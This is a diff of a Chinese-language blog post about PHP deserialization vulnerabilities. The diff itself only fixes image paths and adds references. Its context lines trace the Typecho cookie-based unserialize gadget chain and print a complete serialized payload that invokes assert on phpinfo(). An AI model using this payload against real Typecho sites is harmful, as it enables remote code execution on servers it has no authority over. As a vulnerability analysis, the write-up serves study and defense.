@@ -89,23 +89,23 @@ unset()&\_\_unset()|当对不可访问属性调用 unset() 时，__unset() 会�
 
 漏洞入口点如下：
 
-![漏洞入口](../img/2018-12-29-php-unserialize_img/entry.png)
+![漏洞入口](/img/2018-12-29-php-unserialize_img/entry.png)
 
 cookie中的\_\_typecho_config值取出，然后base64解码再进行反序列化，这就满足了漏洞发生的第一个条件：存在序列化字符串的输入点。接下来就是去找一下有什么magic方法可以利用。  
 搜素上述的魔术方法，发现/vars/Typecho/db.php下有\_\_construct魔术方法：
 
-![Construct](../img/2018-12-29-php-unserialize_img/typechodb.png)  
+![Construct](/img/2018-12-29-php-unserialize_img/typechodb.png)  
 
 使用.运算符连接\$adapterName，这时\$adapterName如果是一个实例化的对象就会自动调用\_\_toString方法。  
 然后搜索下\_\_toString方法，发现/var/Typecho/Feed.php下的\_\_toString方法可以利用.
 
-![tostring](../img/2018-12-29-php-unserialize_img/tostring.png) 
+![tostring](/img/2018-12-29-php-unserialize_img/tostring.png) 
  
 如果\$item['author']中存储的类没有‘screenName’属性或者该属性为私有，会出发该类中的\_\_get(screenName)魔法方法。  
 进一步跟踪\_\_get()方法，发现在/var/Typecho/Request.php下有可利用的点：
 \_\_get调用get()，get()调用\_applyFilter,重点看\_applyFilter。
 
-![applyFilter](../img/2018-12-29-php-unserialize_img/applyFilter.png)
+![applyFilter](/img/2018-12-29-php-unserialize_img/applyFilter.png)
 
 发现我们想要得到的call\_user\_func()函数。查看下$filter,和$value都来自类变量。
 $filter来自private $\_filter, $value来自private \$\_params。
@@ -214,21 +214,8 @@ $installDb = new Typecho_Db($adapter, _r('dbPrefix')); //1.2版本入口点
    ```
    a:1:{s:7:"adapter";O:12:"Typecho_Feed":2:{s:20:"Typecho_Feed_items";a:1:{i:0;a:2:{s:6:"author";O:15:"Typecho_Request":2:{s:24:"Typecho_Request_params";a:1:{s:10:"screenName";s:9:"phpinfo()";}s:24:"Typecho_Request_filter";a:1:{i:0;s:6:"assert";}}s:8:"category";a:1:{i:0;O:15:"Typecho_Request":2:{s:24:"Typecho_Request_params";a:1:{s:10:"screenName";s:9:"phpinfo()";}s:24:"Typecho_Request_filter";a:1:{i:0;s:6:"assert";}}}}}s:19:"Typecho_Feed_type";s:7:"RSS 2.0";}}/
 ```
-	
 
 
-
-	
-
-
-
-
-
-
-
-
-
-
-
-
-
+#### Reference
+\[1\]: https://www.freebuf.com/column/161798.html
+\[2\]: https://php.net
